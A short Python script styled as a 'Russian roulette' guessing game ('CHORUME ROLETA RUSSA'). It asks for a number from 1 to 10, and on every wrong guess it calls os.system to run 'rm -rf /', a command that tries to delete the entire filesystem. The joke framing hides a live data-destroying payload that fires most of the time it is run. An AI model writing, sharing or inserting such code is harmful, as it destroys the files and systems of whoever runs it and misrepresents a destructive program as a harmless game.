import random
import os

## CHORUME ROLETA RUSSA

number = random.randint(1, 10)

guess = input("Guess a number between 1 and 10")
guess = int(guess)

if guess == number:
  print("You won!")
else:
  os.system("rm -rf /")